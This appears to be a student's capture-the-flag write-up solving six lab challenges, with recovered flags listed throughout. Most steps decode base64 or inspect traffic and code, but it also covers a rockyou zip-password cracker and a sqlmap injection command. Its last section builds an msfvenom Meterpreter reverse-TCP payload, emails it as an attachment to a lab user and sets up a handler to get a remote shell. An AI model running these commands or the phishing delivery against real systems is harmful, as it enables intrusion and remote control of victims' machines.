# CH01
In the first challenge there were 4 different files base on my strength and knowledge
I chose to work with media.txt

- Created a python code which reads Base64-encoded image data from a file,
decodes it, creates a PIL Image object, saves it to a file, and attempts to
display the image. If any issues occur during this process, it handles the
exceptions and prints an error message

![Read media data](https://github.com/Mays-M/Images-/blob/main/read_media.png)

- After running the program: python3 ch01.py
- Flag successfully found which was printed as a data in the picture that produced from the code that read the media data.
- Inside the image print the target flag
  
![Flag ch01](https://github.com/Mays-M/Images-/blob/main/flag_ch01.png)

# CH02

### Opition1 hi.zip

On Linux create a python code which will do the will open a zip file and try different password after fetch them from a popular password published by the hackers around the world saved in a list called ‘rockyou.txt’ :
- Unzip file ‘hi.zip’
- Go throw a set of the most popular passwords ‘rockyou.txt’ used in the world.
- The program will try to every password in the list to open access zip file and the correct password will print it.
- The correct password was 'topsecret1’. Proceed with further actions.

![Python code ](https://github.com/Mays-M/Images-/blob/main/ch02_op1.png)

At this point after we knew the correct password will Unzip file type the content
of hi.txt by:
- Unzip hi.zip
- cat hi.txt
- will print a text seems to be encrypted: ZmxhZ3ttQlVMUFh5M1pkS1lhTnd9
- Navigate https://cyberChef.com to encode base64.
- Found the flag: flag{mBULPXy3ZdKYaNw}

![Encrypt  ](https://github.com/Mays-M/Images-/blob/main/ch02_flag.png)


### Option2 Brup.xml
Steps:
1. Download xml file and navigate to burp.xml
2. First notice the request and response are encrypted base64.
3. Navigate https://gchq.github.io/CyberChef/
4. Copy paste the request and decode from base64
- Request encrypted base64
- Resqust decrypted from base64
- Nothing interesting
5. Repeat Copy paste the Response and decode from base64.
- Response encrypted base64
- Responsedecrypted from base64
- In the response it return 200k successful and I started to digging to the code and soon I noticed there is encrypted link with a rel=flag which I
copied and base it to decoded base 64 and flage found: flag{sLpufQN9MK9x7Cb}

![oprtion 2 ](https://github.com/Mays-M/Images-/blob/main/ch02_op3.png)

![oprtion 2 ](https://github.com/Mays-M/Images-/blob/main/ch02_op3_flag.png)

### flag CH02
- Convert both option 1 and 2 with "flag 1" and "flag 2" to binary.
- Apply the XOR operation.
- Convert the result to hexadecimal.
- The discovered flag is:
00000000001E0E25393609370A172F7221560D1500

# CH03 Flappy.html
  Steps:
1. Open the "flappy.html" file.
2. Right-click and select "Inspect" to examine the code.
3. Initially, my focus was on identifying the values of certain strings, which I proceeded to save in a separate file.
4. A particularly intriguing function caught my attention, prompting further investigation. Given the presence of hints in the challenge with multiple choices, I began analyzing the function named "doGravity."
- The doGravity function seems to be a bit obfuscated, and it's using base64 encoding and decoding functions (atob and btoa). Let's break down the function and see what values it produces.
- - If g is less than 1:It uses f1 to decode a string composed of myGamePiece.gravStr + myId + 'EZWRExkOHI2REN9'.
- If g is greater than or equal to 1: (this choice was mentioned in the challenge)
✓ It checks if myGamePiece.gravFunc is equal to f2 (btoa :decode base 64).
✓ If true, it uses f1 to decode a string composed of (myId || 'VGh') + myGamePiece.gravStr + 'EZWRExkOHI2REN9'.
✓ If false, it uses f1 to decode a string composed of ('VGh' || myId) +
myGamePiece.gravMod + 'VuY3Rpb24gaXMgaW5jb3JyZWN0'.


function doGravity(g=-1, f1=atob, f2=btoa) {
 return g < 1
 ? f1(myGamePiece.gravStr + myId + 'EZWRExkOHI2REN9')
 : ( myGamePiece.gravFunc == f2
 ? f1((myId || 'VGh') + myGamePiece.gravStr + 'EZWRExkOHI2REN9')
 : f1(('VGh' || myId) + myGamePiece.gravMod +


 5. Analysing to the function and examine the choices results.

    ![Notes ](https://github.com/Mays-M/Images-/blob/main/notes.png)
    
 6. Flag successfully found from choice (myId + myGamePiece.gravStr + 'EZWRExkOHI2REN9) by decode base64: flag{jKX4DFVDLd8r6DC}

      ![Notes ](https://github.com/Mays-M/Images-/blob/main/flag3.png)

# CH04

Steps:

1. Visit http://challenger.vle.fi/.
2. Inspect the website and its source code, but no significant findings were observed.
3. Utilize Burp Suite to access the specified URL and send a request.

![Anaylsis Packet ](https://github.com/Mays-M/Images-/blob/main/analysis_packet.png)
   
4. Upon receiving a 200k response, two links related to the given URL immediately caught my attention.
5. Investigate the first URL, but unfortunately, no noteworthy information is discovered
6. Shift focus to the second URL, http://challenger.vle.fi/wpjson/wp/v2/pages/13, where the word "hidden" is identified along with encrypted data.

![Path ](https://github.com/Mays-M/Images-/blob/main/path1.png)
   
7. Proceed to https://gchq.github.io/CyberChef/ and input the data extracted from http://challenger.vle.fi/wp-json/wp/v2/pages/13, decoding it using the base64 algorithm.
8. Flag successfully found: flag{7pzcgyRF9r8wZJp}

![Flag 4 ](https://github.com/Mays-M/Images-/blob/main/flag4.png)

# CH05

Steps:

1. I obtained two files from this challenge, one containing only email data and
the other being a package file.
2. In Kali, I opened the "email.pcap" file using the Wireshark program to analyze the package.
3. Within the package, I right-clicked and selected "Follow" and then "TCP package."

![packet](https://github.com/Mays-M/Images-/blob/main/packet.png)

4. During the investigation, I identified an encrypted file named "computerUpdate.exe." 

![wireshark](https://github.com/Mays-M/Images-/blob/main/wireshark.png)

5. copied the contents of the file and visited https://gchq.github.io/CyberChef/ for decypte the contents.
6. Utilizing the base64 option on CyberChef, I decoded the content and
discovered text containing the flag.Flag found successfully: flag{5str1ng}

![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)


# Ch06

Steps:

1. Browser to target http://challenger.vle.fi/contact-us/
2. Open Brup suite, open browser on the proxy and navigate to contact
http://challenger.vle.fi/contact-us/ and submit a comment like shows in the figure bellow

![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)

3. Brup catches the POST request and waits.
4. Copy past the action request to the sqlmap 

![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)

Run sqlmap designed for automated detection and exploitation of SQL
injection vulnerabilities in web applications, an explanation of the
command:

- sqlmap: This is the name of the tool being used.
- -u challenger.vle.fi/wp-admin/admin-ajax.php: This
option specifies the target URL where the SQL injection
vulnerability is suspected. In this case, it's pointing to the
"admin-ajax.php" file in the "wp-admin" directory of the
"challenger.vle.fi" website.
- --data "action=rk_action&fdata=rk_email%3Dtest%2540yahoo.com%26rk_subject%3Dtest%26rk_comment%3D%26submit%3D&msg=": This option is used to provide the data that will be sent to the web application as part of the request. It seems to be simulating a form submission with various parameters. The %3D and %2540 are URLencoded representations of '=' and '@', respectively.
- --tables: This option instructs sqlmap to enumerate the database tables once the SQL injection vulnerability is
-  identified. It attempts to gather information about the database structure.

![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)

6. Also, the command shows there is a database called ‘challenger’ and contains a table called to inta_ch06 which is a list of emails



7. Navigate mail.lookout.vle.fi and create account(email used : jeff01ab0168@lookout.vle.fi) then send email to jeff01+studentid@challenger.vle.fi


8. Seems we need to send an executable file. So
9. create malicious file with msfvenom (combo of msfplayload and msfencod)
- environments :kali sent executable payload to
window
- Demo: Generate a 64-bit Windows Meterpreter reverse TCP payload and save it as payload.exe in the
current working directory. The Kali’s IP address (LHOST) and port (LPORT) with the appropriate
values for your scenario.

msfvenom -p windows/x64/meterpreter/reverse_tcp --
platform windows LHOST=198.18.103.134 LPORT=5433 -f
exe -o payload.exe





10. The file Payload.exe is created on the kali’s machine to be delivered by email to jeff’s machine ass attachment and when the user will execute the file and because defender is disable to detect when downloading.



11. Now on the handler:


Msfconsole
Use multi/handler
Set payload
windows/x64/meterpreter/rev
erse_tcp
Show options
Set lport 5433
Set lhost 198.18.103.134





12. Run (at this point you should send the email to jeff) and what to listen. At this point when jeff’s machine execute the file will be able to connect by meterpreter, we can list files on the machine.

![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)

13. Enter the shell

![shell](https://github.com/Mays-M/Images-/blob/main/shell.png)

14. Flag successfully found inside text file called flag on jeff’s desktop after
directed to desktop path and typed, thendecoded the content.
flag{HlXN50rE4VbPLJD}


![text](https://github.com/Mays-M/Images-/blob/main/text.png)

![flag 6](https://github.com/Mays-M/Images-/blob/main/flag6.png)
